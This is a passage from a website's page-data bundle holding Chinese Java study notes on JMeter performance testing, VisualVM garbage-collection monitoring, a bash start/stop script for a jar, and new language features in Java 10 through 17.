15。每一格的颜色代表了处于该年龄级别的对象数量。例如，第一列（年龄级别 0）有一个橙色的格子，表示有一些对象刚刚进入年轻代，它们的年龄为 0。第二列（年龄级别 1）有两个橙色格子，说明有两组对象已经经历了第一次垃圾收集，现在它们的年龄为 1。\n\n请注意，这个直方图并不反映实际的数量，而是通过颜色块来表示相对数量。因此，两个橙色格子并不一定表示确切的两个对象，而只是表明有多个对象处于这个年龄级别。',normalizedContent:'# 基本理论\n\n除了本身要掌握 java api 的基本使用外，我们还需要对 java 的所写项目以及测试方法要有所了解，首先我们得理解什么是响应时间，请求时间，hps，tps 以及 qps 等。\n\n * 响应时间是指用户从客户端发起一个请求开始，到客户端接收到从服务器端返回的响应结果，整个过程所耗费的时间。\n * 请求时间是客户端发送请求到服务端接收到请求的时间。\n * hps (hits per second) 每秒点击次数，单位是 次 / 秒\n * tps (hits per second) 系统每秒处理交易数 (事务数，接口逻辑数)，单位是笔 / 秒\n * qps (query per second) 系统每秒处理查询次数，单位是 次 / 秒。\n * 最大、最少响应时间\n   指用户发出请求或者指令到系统做出反应 (响应) 的最大、最少时间。\n * 90% 响应时间\n   指 100 个人，有 90 个人 1s 内得到系统的反馈，就代表优化到一定的程度，还有 10% 相对优化复杂度就很高了。\n\n对于互联网业务中，如果某些业务有且仅有一个请求链接，那么 tps=qps=hps，一盘情况下用 tps 来衡量整个业务流程，用 qps 来衡量接口查询次数，用 hps 来表示对服务器单击请求。 无论 tps，qps，hps，这些指标都是衡量系统处理能力非常重要的指标，越大越好，根据经验，一般情况下：\n\n 1. 金融行业 1k tps~50k tps\n 2. 保险行业 100 tps~10w tps\n 3. 制造行业 10 tps~5k tps\n 4. 互联网电子商务 1w tps~100w tps\n 5. 互联网中型网站 1k tps~5w tps\n 6. 互联网小型网站 500 tps~1w tps\n\n对于系统来说有三个重要的指标是我们一定要看的\n\n * 吞吐量：每秒系统能够处理的请求数，任务数\n * 响应时间：服务处理一个请求或一个任务的耗时\n * 错误率：一批请求中结果出错的请求所占比例\n\n\n# jmeter 使用\n\n\n# jmeter 下载\n\n地址\n\n> 以下所有的请求时间都为 ms，除非标有时间单位。\n\n\n# 转换中文\n\n\n\n\n# 创建线程组\n\n\n\n\n\n线程数：模拟并发用户数量\nramp-up 时间（秒）：在设置的时间结束之前，启动所有线程数\n循环次数：单个线程执行几次\n\n\n\n\n# 添加 http 请求\n\n\n\n\n\n\n\n\n\n\n# 添加结果树\n\n\n\n\n\n会把所有请求的信息列出来。\n\n\n# 添加汇总报告\n\n\n\n\n\n\n# 聚合报告\n\n\n\n\n\n\n# 汇总图\n\n\n\n\n\n\n# jmeter address already in use\n\nwindows 本身提供的端口机制问题。\nwindows 提供给我们 tcp/ip 的端口为 1024-5000，并且要 4 分钟来循环回收他们，就导致我们在短时间内跑大量的请求时将端口沾满。\n解决方式：\n\n 1. cmd 中输入 regedit 命令打开注册表\n 2. 在 hkey_local_machine\\system\\currentcontrolset\\services\\tcpip\\parameters ，右击 parameters ，添加一个新的 dword，名字为 maxuserport，双击 maxuserport ，输入数值数据为 65534，基数选择十进制 (如果是分布式运行的话，控制机器和负载机制都需要这样操作)，修改完毕后重启电脑才能生效。相同的位置还可以添加 tcptimedwaitdelay 值为 30，和 maxuserport 添加方式一样。\n\n\n# jvisualvm\n\n\n# 启动 jvisualvm\n\njvisualvm 在 jdk 包中已经有了，只需要打开 cmd 输入 jvisualvm 就能启动\n\n> 在高版本 jdk（大于 1.8 或后期更新的 1.8 版本）中已经不会再自动集成 visualvm，https://visualvm.github.io/index.html 到这里进行下载\n\n下载的 visualvm 默认会找环境中的 jdk1.8，但如果你不是 jdk1.8 则可以修改配置（visualvm_218/etc/visualvm.conf），修改内容如下：\n\n# 设置成自己安装的java路径\nvisualvm_jdkhome="d:\\tool\\java\\java17"\n\n\n1\n2\n\n\n\n# 线程\n\n\n\n运行：正常运行\n休眠：sleep 中的线程\n等待：wait 中的线程\n驻留：线程池里得空闲线程\n监视：正在阻塞的线程，等待锁的。\n\n\n# 安装插件\n\n安装插件前先检查更新，如果出错了需要更新地址，先 工具 - 插件 - 更新 - 检查更新 来检测是否有错，如果有错，先查看 jdk 版本，然后去 https://visualvm.github.io/pluginscenters.html，找到相同版本的 gz url，再到 插件 - 设置 - 编辑，更新 url 即可。\n\n\n\nvisual gc 通过它可以看到整个垃圾回收的过程。安装完成后，退出重进。\n\n\n\ngc time：14 collections，798.209ms last cause ：system.gc () = 发生了 14 次 gc，花了 798.209ms。\neden space (666.000m，292.500m)：148.296m，11 collections，223.272ms = 发生了 11 次 gc，花了 223.272ms\n\n\n# histogram 直方图\n\n\n\n直方图只在使用 g1 垃圾回收器才会出现\n\n * tenuring threshold=15：这表示对象在晋升到老年代之前需要在年轻代中经历的最少垃圾收集次数。如果一个对象在年轻代中生存超过 15 次垃圾收集循环，那么它将被转移到老年代。\n * max tenuring threshold=15：这是 tenuring 阈值允许的最大值。在你的例子中，tenuring threshold 和 max tenuring threshold 都设置为 15，这意味着这是 jvm 允许的最长时间，对象在年轻代中可以逗留而不被晋升到老年代。这限制了年轻代对象的年龄上限，简化了晋升决策。\n * desired survivor size=268435456：这是 g1 垃圾收集器期望的每个 survivor 空间的理想大小。理想情况下，survivor 空间的容量会被设为这个值，以容纳从 eden 区或另一个 survivor 区存活下来的对象。这个设置有助于优化年轻代的内存分配和回收效率。\n * current survivor size=8：这表示当前某个 survivor 空间的实际大小，单位是字节。给出的例子中，显示的 8 字节看起来异常小，几乎肯定是一个显示错误或者误解，因为这样的大小远远不足以满足正常的对象存储需求。正常情况下，这个值应该接近或等于 desired survivor size。可能是由于在 visualvm 捕获那一刻状态时，survivor 空间正在进行调整，或者存在某种报告上的偏差，需要进一步检查和确认。\n\n从 0 到 15。每一格的颜色代表了处于该年龄级别的对象数量。例如，第一列（年龄级别 0）有一个橙色的格子，表示有一些对象刚刚进入年轻代，它们的年龄为 0。第二列（年龄级别 1）有两个橙色格子，说明有两组对象已经经历了第一次垃圾收集，现在它们的年龄为 1。\n\n请注意，这个直方图并不反映实际的数量，而是通过颜色块来表示相对数量。因此，两个橙色格子并不一定表示确切的两个对象，而只是表明有多个对象处于这个年龄级别。',charsets:{cjk:!0}},{title:"jar启动脚本",frontmatter:{title:"jar启动脚本",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/5/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/5.jar%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC.html",relativePath:"00.语言/01.JAVA/04.其他/5.jar启动脚本.md",key:"v-c1fddfba",path:"/language/java/other/5/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'#!/bin/bash\n#入参设置\nFUNC=$1\nAPP_NAME=$2\nXMS=512M\nXMX=512M\nSCRIPT=$0\n\nif [ "X$3" != "X" ]; then\n    XMS=$3\nfi\n\nif [ "X$4" != "X" ]; then\n    XMX=$4\nfi\n\n# echo $FUNC $APP_NAME $XMS $XMX\n\n#使用说明，用来提示输入参数\nusage() {\n    echo "Usage: sh 执行脚本.sh [start|stop|restart|status]"\n    exit 1\n}\n\n#检查程序是否在运行\nis_exist(){\n    # pid=`ps -ef|grep $APP_NAME|grep -v grep|awk \'{print $2}\' `\n    pid=`ps -ef|grep $APP_NAME|grep -v grep|grep -v monitor|grep -v $SCRIPT|awk \'{print $2}\' `\n    #如果不存在返回1，存在返回0\n    # echo \'pid is ----\'${pid}\n    if [ -z "${pid}" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#启动方法\nstart(){\n    is_exist\n    if [ "$?" -eq \'0\' ]; then\n        echo "${APP_NAME} is already running. pid=${pid} ."\n    else\n        # 启动应用程序\n        nohup java -Xms$XMX -Xmx$XMX $JAVA_OPTS -jar -Duser.timezone=America/Sao_Paulo  $APP_NAME.jar --spring.profiles.active=test > $APP_NAME.out 2>&1 &\n        echo "${APP_NAME} start."\n        tail -f $APP_NAME.out\n    fi\n}\n\n#停止方法\nstop(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        kill -9 $pid\n    else\n        echo "${APP_NAME} is not running"\n    fi\n}\n\n#输出运行状态\nstatus(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        echo "${APP_NAME} is running. Pid is ${pid}"\n    else\n        echo "${APP_NAME} is NOT running."\n    fi\n}\n\n#重启\nrestart(){\n    stop\n    start\n}\n\n#根据输入参数，选择执行对应方法，不输入则执行使用说明\ncase "$1" in\n    "start")\n        start\n    ;;\n    "stop")\n        stop\n    ;;\n    "status")\n        status\n    ;;\n    "restart")\n        restart\n    ;;\n    *)\n        usage\n    ;;\nesac\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n',normalizedContent:'#!/bin/bash\n#入参设置\nfunc=$1\napp_name=$2\nxms=512m\nxmx=512m\nscript=$0\n\nif [ "x$3" != "x" ]; then\n    xms=$3\nfi\n\nif [ "x$4" != "x" ]; then\n    xmx=$4\nfi\n\n# echo $func $app_name $xms $xmx\n\n#使用说明，用来提示输入参数\nusage() {\n    echo "usage: sh 执行脚本.sh [start|stop|restart|status]"\n    exit 1\n}\n\n#检查程序是否在运行\nis_exist(){\n    # pid=`ps -ef|grep $app_name|grep -v grep|awk \'{print $2}\' `\n    pid=`ps -ef|grep $app_name|grep -v grep|grep -v monitor|grep -v $script|awk \'{print $2}\' `\n    #如果不存在返回1，存在返回0\n    # echo \'pid is ----\'${pid}\n    if [ -z "${pid}" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#启动方法\nstart(){\n    is_exist\n    if [ "$?" -eq \'0\' ]; then\n        echo "${app_name} is already running. pid=${pid} ."\n    else\n        # 启动应用程序\n        nohup java -xms$xmx -xmx$xmx $java_opts -jar -duser.timezone=america/sao_paulo  $app_name.jar --spring.profiles.active=test > $app_name.out 2>&1 &\n        echo "${app_name} start."\n        tail -f $app_name.out\n    fi\n}\n\n#停止方法\nstop(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        kill -9 $pid\n    else\n        echo "${app_name} is not running"\n    fi\n}\n\n#输出运行状态\nstatus(){\n    is_exist\n    if [ $? -eq "0" ]; then\n        echo "${app_name} is running. pid is ${pid}"\n    else\n        echo "${app_name} is not running."\n    fi\n}\n\n#重启\nrestart(){\n    stop\n    start\n}\n\n#根据输入参数，选择执行对应方法，不输入则执行使用说明\ncase "$1" in\n    "start")\n        start\n    ;;\n    "stop")\n        stop\n    ;;\n    "status")\n        status\n    ;;\n    "restart")\n        restart\n    ;;\n    *)\n        usage\n    ;;\nesac\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n',charsets:{cjk:!0}},{title:"JAVA 10/11/12/13/14/15/16/17 新特性总结",frontmatter:{title:"JAVA 10/11/12/13/14/15/16/17 新特性总结",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/version/3/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/03.%E7%89%88%E6%9C%AC/3.JAVA%2010-17%20%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.html",relativePath:"00.语言/01.JAVA/03.版本/3.JAVA 10-17 新特性总结.md",key:"v-585fb790",path:"/language/java/version/3/",headers:[{level:2,title:"JAVA 10",slug:"java-10",normalizedTitle:"java 10",charIndex:2},{level:3,title:"局部变量类型推断",slug:"局部变量类型推断",normalizedTitle:"局部变量类型推断",charIndex:14},{level:2,title:"JAVA 11",slug:"java-11",normalizedTitle:"java 11",charIndex:313},{level:3,title:"用于Lambda的形参局部变量语法",slug:"用于lambda的形参局部变量语法",normalizedTitle:"用于 lambda 的形参局部变量语法",charIndex:396},{level:3,title:"针对String类的方法增强",slug:"针对string类的方法增强",normalizedTitle:"针对 string 类的方法增强",charIndex:696},{level:3,title:"全新的HttpClient使用",slug:"全新的httpclient使用",normalizedTitle:"全新的 httpclient 使用",charIndex:1358},{level:2,title:"java12",slug:"java12",normalizedTitle:"java12",charIndex:1944},{level:3,title:"新的switch语法",slug:"新的switch语法",normalizedTitle:"新的 switch 语法",charIndex:2055},{level:2,title:"java13",slug:"java13",normalizedTitle:"java13",charIndex:3334},{level:3,title:"文本块",slug:"文本块",normalizedTitle:"文本块",charIndex:3345},{level:2,title:"java14",slug:"java14",normalizedTitle:"java14",charIndex:3884},{level:3,title:"新的 instanceof 语法",slug:"新的-instanceof-语法",normalizedTitle:"新的 instanceof 语法",charIndex:3895},{level:3,title:"空指针异常的改进",slug:"空指针异常的改进",normalizedTitle:"空指针异常的改进",charIndex:4386},{level:3,title:"记录类型 Record",slug:"记录类型-record",normalizedTitle:"记录类型 record",charIndex:4477},{level:2,title:"java17",slug:"java17",normalizedTitle:"java17",charIndex:5324},{level:3,title:"密封类型",slug:"密封类型",normalizedTitle:"密封类型",charIndex:5335}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"JAVA 10 局部变量类型推断 JAVA 11 用于Lambda的形参局部变量语法 针对String类的方法增强 全新的HttpClient使用 java12 新的switch语法 java13 文本块 java14 新的 instanceof 语法 空指针异常的改进 记录类型 Record java17 密封类型",content:'# JAVA 10\n\n\n# 局部变量类型推断\n\n在 java 中，我们可以使用自动类型推断\n\n    public static void main(String[] args) {\n        var a = "hello world";\n        System.out.println("a = " + a);\n    }\n\n\n1\n2\n3\n4\n\n\n但是注意，var 关键字必须位于有初始值设定的变量上，否则编译都不会通过。java 终究不像 JS 那样进行动态推断，这种类型推断仅仅发生在编译期间，到最后编译完成还是会变成具体类型的。\n\nvar 关键字不能做为属性或成员变量使用，只能做为局部变量使用。\n\n\n# JAVA 11\n\nJava11 是继 Java8 之后的又一个 TLS 长期维护版本，在 Java 17 出现之前，一直都是此版本做为广泛使用的版本，其中比较关键的是用于 Lambda 的形参局部变量语法。\n\n\n# 用于 Lambda 的形参局部变量语法\n\n在 Java10 我们认识了 var 关键字，它能够让局部变量自动进行类型推断，不过它不支持在 lambda 中使用，所以在 Java11 终于支持了。\n\n    public static void main(String[] args) {\n        Consumer<String> consumer = (var s) -> System.out.println(s.length());\n        consumer.accept("你好");\n    }\n\n\n1\n2\n3\n4\n\n\n\n# 针对 String 类的方法增强\n\n    public static void main(String[] args) {\n        var str = "AB\\nC  \\nD  ";\n        // 判断是否字符串为空或者仅包含空格\n        System.out.println(str.isBlank());\n        str\n                // 根据字符串中的 \\n 换行符进行切割，分为多个字符串，并转换为Stream进行操作\n                .lines()\n                .forEach(System.out::println);\n\n        // 根据传入次数，复制原有字符串并拼接到末尾 "AB\\nC\\nDAB\\nC\\nD"\n        System.out.println(str.repeat(2));\n\n        // 去除首位空格\n        System.out.println(str.strip());\n        // 去除首部空格\n        System.out.println(str.stripLeading());\n        // 去除尾部空格\n        System.out.println(str.stripTrailing());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 全新的 HttpClient 使用\n\n在 java9 的时候其实就已经引入了全新的 HttpClient API，用于取代之前比较老的 HttpURLConnection 类，新的 API 支持最新的 HTTP2 和 WebSocket 协议。\n\n    public static void main(String[] args) throws URISyntaxException, IOException, InterruptedException {\n        // 创建一个客户端\n        var httpClient = HttpClient.newHttpClient();\n        // 创建一个请求\n        var request = HttpRequest.newBuilder(new URI("http://www.baidu.com")).GET().build();\n        // 发送得到响应\n        var send = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        System.out.println(send.body());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# java12\n\njava 12-16 这五个版本并非长期版本，所以很多特性都是一种处于实验性功能，12/13 版本引入了一些实验性功能，并根据反馈进行调整，最后在后续版本中正式开放使用，其实就是体验服的那种感觉。\n\n\n# 新的 switch 语法\n\n新的语法可以大大方便我们的编写，但是还是美中不足的是不能支持范围匹配\n\n    /**\n     * 传入分数\n     * 90-100 优秀\n     * 70-90 良好\n     * 60-70 及格\n     * 0-60 差\n    **/\n    public static String old(int score){\n        score/=10;\n        String str;\n        switch (score){\n            case 10:\n            case 9:\n                str = "优秀";\n                break;\n            case 8:\n            case 7:\n                str = "良好";\n                break;\n            case 6:\n                str = "几个";\n                break;\n            default:\n                str = "不及格";\n        }\n        return str;\n    }\n\n    public static String java12(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "优秀";\n            case 8,7 -> "良好";\n            case 6 -> "几个";\n            default -> "不及格";\n        };\n    }\n\n    public static String java12_1(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "优秀";\n            case 8,7 -> "良好";\n            case 6 -> "几个";\n            default -> {\n                System.out.println("其他方式");\n                yield "不及格";\n            }\n        };\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# java13\n\n\n# 文本块\n\n当我们需要使用复杂字符串时，可能字符串中包含了很多需要转移的字符，比如双引号等，这时我们就可以使用三引号来囊括字符串\n\n    public static void main(String[] args) throws URISyntaxException, IOException, InterruptedException {\n        var s = """\n                    dsafdsafdsa\n                        dfdsafd\n                            ""fdsa \\n \\n dsfdsa\n                            \\r ffff \\t dsfad \n                """;\n        System.out.println(s);\n    }\n\n结果打印：\n    dsafdsafdsa\n        dfdsafd\n            ""fdsa \n \n dsfdsa\n ffff \t dsfad\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# java14\n\n\n# 新的 instanceof 语法\n\n    public boolean old(Object o) {\n        if (this == o) {return true;}\n        if (o instanceof User) {\n            User user = (User) o;\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n    public boolean java16(Object o) {\n        if (this == o) {return true;}\n        if (o instanceof User user) {\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 空指针异常的改进\n\n在旧版本中如果出现空指针异常，报错只会给我们空指针发生在哪一行，具体哪个变量为空并不会告诉我们，需要我们自己打 debug，在新的版本中会明确告知我们。\n\n\n# 记录类型 Record\n\n继类、接口、枚举、注解之后的又一新类型来了，他的名字叫 记录 ，在 java14 中首次出场，这一出场，Lombok 的噩梦来了。 在实际开发中，很多类仅仅只是充当一个实体类罢了，保存的是一些不可变数据，比如我们从数据库中查询的账户信息，最后被映射为一个实体类\n\n@Data\npublic class User {\n\n    private String name;\n  \n    private Integer age;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nLombok 可以说时简化代码的神器，它能在编译时自动生成 get、set、构造器、toString () 方法等，在编写这些实体类时，简直不要太好用，Record 可以让我们不需要显式地定义构造函数、getters 方法或 equals 和 hashCode 方法。所有这些都会由 Records 自动生成。\n\n记录类型本质上也是一个普通类，不过是 final 类型且继承自 java.lang.Record 抽象类的，他会在编译时，会自动编译出 get、hashCode、equals、toString 等方法。\n\n// 只能把字段写道括号中\npublic record User(String name,Integer age) {\n    public static void a(){\n    }\n    public static void main(String[] args) {\n        User user = new User("张三",2);\n        System.out.println(user.name());\n        System.out.println(user);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n但有些功能还是没有办法与 Lombok 相比的，如 @SL4J，链式调用，无参构造函数不支持等。\n\n\n# java17\n\n\n# 密封类型\n\n密封类型可以说时 java17 正式推出的又一重磅类型，它在 java15 首次提出并测试了两个版本。\n\n在 java 中，我们可以通过继承（extends 关键字）来实现类的能力复用，扩展与增强。但有的时候，可能并不是所有的类我们都希望能够被继承。所以，我们需要对继承关系有一些限制的控制手段，而密封类的作用就是限制类的继承。实际上在之前我们如果不希望别人继承我们的类，可以直接添加 final 关键字。\n\n这样有一个缺点，如果添加了 final 关键字，那么无论是谁，包括我们自己也是没办法实现继承的，但是现在我们有一个需求，只允许我们自己写的类继承，但是不允许别人写的类继承，这时该咋写？在 java17 之前想要实现就很麻烦。\n\n# 旧版本\npublic final class A{\n}\n\n# 新版本 sealed\npublic sealed class A permits B {\n}\n# 继承 A\npublic final class B extends A {\n}\npublic sealed class B extends A {\n}\npublic non-sealed B extends A {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n密封类型有以下要求：\n\n * 可以基于普通类、抽象类、接口，也可以继承自其他接口的子类或是实现其他接口的类等。\n * 必须有子类继承，且不能是匿名内部类或是 lambda 的形式\n * sealed 写在原来 final 的位置，但不能和 final、non-sealed 关键字同时出现，只能选其一\n * 继承的子类必须显示的标记为 final（表示这个类不能被继承）、sealed（表示这个子类也可以有其他密封的或非密封的子类） 或是 non-sealed （表示这个子类不能有子类，但它可以被其他类继承）类型',normalizedContent:'# java 10\n\n\n# 局部变量类型推断\n\n在 java 中，我们可以使用自动类型推断\n\n    public static void main(string[] args) {\n        var a = "hello world";\n        system.out.println("a = " + a);\n    }\n\n\n1\n2\n3\n4\n\n\n但是注意，var 关键字必须位于有初始值设定的变量上，否则编译都不会通过。java 终究不像 js 那样进行动态推断，这种类型推断仅仅发生在编译期间，到最后编译完成还是会变成具体类型的。\n\nvar 关键字不能做为属性或成员变量使用，只能做为局部变量使用。\n\n\n# java 11\n\njava11 是继 java8 之后的又一个 tls 长期维护版本，在 java 17 出现之前，一直都是此版本做为广泛使用的版本，其中比较关键的是用于 lambda 的形参局部变量语法。\n\n\n# 用于 lambda 的形参局部变量语法\n\n在 java10 我们认识了 var 关键字，它能够让局部变量自动进行类型推断，不过它不支持在 lambda 中使用，所以在 java11 终于支持了。\n\n    public static void main(string[] args) {\n        consumer<string> consumer = (var s) -> system.out.println(s.length());\n        consumer.accept("你好");\n    }\n\n\n1\n2\n3\n4\n\n\n\n# 针对 string 类的方法增强\n\n    public static void main(string[] args) {\n        var str = "ab\\nc  \\nd  ";\n        // 判断是否字符串为空或者仅包含空格\n        system.out.println(str.isblank());\n        str\n                // 根据字符串中的 \\n 换行符进行切割，分为多个字符串，并转换为stream进行操作\n                .lines()\n                .foreach(system.out::println);\n\n        // 根据传入次数，复制原有字符串并拼接到末尾 "ab\\nc\\ndab\\nc\\nd"\n        system.out.println(str.repeat(2));\n\n        // 去除首位空格\n        system.out.println(str.strip());\n        // 去除首部空格\n        system.out.println(str.stripleading());\n        // 去除尾部空格\n        system.out.println(str.striptrailing());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 全新的 httpclient 使用\n\n在 java9 的时候其实就已经引入了全新的 httpclient api，用于取代之前比较老的 httpurlconnection 类，新的 api 支持最新的 http2 和 websocket 协议。\n\n    public static void main(string[] args) throws urisyntaxexception, ioexception, interruptedexception {\n        // 创建一个客户端\n        var httpclient = httpclient.newhttpclient();\n        // 创建一个请求\n        var request = httprequest.newbuilder(new uri("http://www.baidu.com")).get().build();\n        // 发送得到响应\n        var send = httpclient.send(request, httpresponse.bodyhandlers.ofstring());\n        system.out.println(send.body());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# java12\n\njava 12-16 这五个版本并非长期版本，所以很多特性都是一种处于实验性功能，12/13 版本引入了一些实验性功能，并根据反馈进行调整，最后在后续版本中正式开放使用，其实就是体验服的那种感觉。\n\n\n# 新的 switch 语法\n\n新的语法可以大大方便我们的编写，但是还是美中不足的是不能支持范围匹配\n\n    /**\n     * 传入分数\n     * 90-100 优秀\n     * 70-90 良好\n     * 60-70 及格\n     * 0-60 差\n    **/\n    public static string old(int score){\n        score/=10;\n        string str;\n        switch (score){\n            case 10:\n            case 9:\n                str = "优秀";\n                break;\n            case 8:\n            case 7:\n                str = "良好";\n                break;\n            case 6:\n                str = "几个";\n                break;\n            default:\n                str = "不及格";\n        }\n        return str;\n    }\n\n    public static string java12(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "优秀";\n            case 8,7 -> "良好";\n            case 6 -> "几个";\n            default -> "不及格";\n        };\n    }\n\n    public static string java12_1(int score){\n        score/=10;\n        return switch (score){\n            case 10,9 -> "优秀";\n            case 8,7 -> "良好";\n            case 6 -> "几个";\n            default -> {\n                system.out.println("其他方式");\n                yield "不及格";\n            }\n        };\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# java13\n\n\n# 文本块\n\n当我们需要使用复杂字符串时，可能字符串中包含了很多需要转移的字符，比如双引号等，这时我们就可以使用三引号来囊括字符串\n\n    public static void main(string[] args) throws urisyntaxexception, ioexception, interruptedexception {\n        var s = """\n                    dsafdsafdsa\n                        dfdsafd\n                            ""fdsa \\n \\n dsfdsa\n                            \\r ffff \\t dsfad \n                """;\n        system.out.println(s);\n    }\n\n结果打印：\n    dsafdsafdsa\n        dfdsafd\n            ""fdsa \n \n dsfdsa\n ffff \t dsfad\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# java14\n\n\n# 新的 instanceof 语法\n\n    public boolean old(object o) {\n        if (this == o) {return true;}\n        if (o instanceof user) {\n            user user = (user) o;\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n    public boolean java16(object o) {\n        if (this == o) {return true;}\n        if (o instanceof user user) {\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 空指针异常的改进\n\n在旧版本中如果出现空指针异常，报错只会给我们空指针发生在哪一行，具体哪个变量为空并不会告诉我们，需要我们自己打 debug，在新的版本中会明确告知我们。\n\n\n# 记录类型 record\n\n继类、接口、枚举、注解之后的又一新类型来了，他的名字叫 记录 ，在 java14 中首次出场，这一出场，lombok 的噩梦来了。 在实际开发中，很多类仅仅只是充当一个实体类罢了，保存的是一些不可变数据，比如我们从数据库中查询的账户信息，最后被映射为一个实体类\n\n@data\npublic class user {\n\n    private string name;\n  \n    private integer age;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlombok 可以说时简化代码的神器，它能在编译时自动生成 get、set、构造器、tostring () 方法等，在编写这些实体类时，简直不要太好用，record 可以让我们不需要显式地定义构造函数、getters 方法或 equals 和 hashcode 方法。所有这些都会由 records 自动生成。\n\n记录类型本质上也是一个普通类，不过是 final 类型且继承自 java.lang.record 抽象类的，他会在编译时，会自动编译出 get、hashcode、equals、tostring 等方法。\n\n// 只能把字段写道括号中\npublic record user(string name,integer age) {\n    public static void a(){\n    }\n    public static void main(string[] args) {\n        user user = new user("张三",2);\n        system.out.println(user.name());\n        system.out.println(user);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n但有些功能还是没有办法与 lombok 相比的，如 @sl4j，链式调用，无参构造函数不支持等。\n\n\n# java17\n\n\n# 密封类型\n\n密封类型可以说时 java17 正式推出的又一重磅类型，它在 java15 首次提出并测试了两个版本。\n\n在 java 中，我们可以通过继承（extends 关键字）来实现类的能力复用，扩展与增强。但有的时候，可能并不是所有的类我们都希望能够被继承。所以，我们需要对继承关系有一些限制的控制手段，而密封类的作用就是限制类的继承。实际上在之前我们如果不希望别人继承我们的类，可以直接添加 final 关键字。\n\n这样有一个缺点，如果添加了 final 关键字，那么无论是谁，包括我们自己也是没办法实现继承的，但是现在我们有一个需求，只允许我们自己写的类继承，但是不允许别人写的类继承，这时该咋写？在 java17 之前想要实现就很麻烦。\n\n# 旧版本\npublic final class a{\n}\n\n# 新版本 sealed\npublic sealed class a permits b {\n}\n# 继承 a\npublic final class b extends a {\n}\npublic sealed class b extends a {\n}\npublic non-sealed b extends a {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n密封类型有以下要求：\n\n * 可以基于普通类、抽象类、接口，也可以继承自其他接口的子类或是实现其他接口的类等。\n * 必须有子类继承，且不能是匿名内部类或是 lambda 的形式\n * sealed 写在原来 final 的位置，但不能和 final、non-sealed 关键字同时出现，只能选其一\n * 继承的子类必须显示的标记为 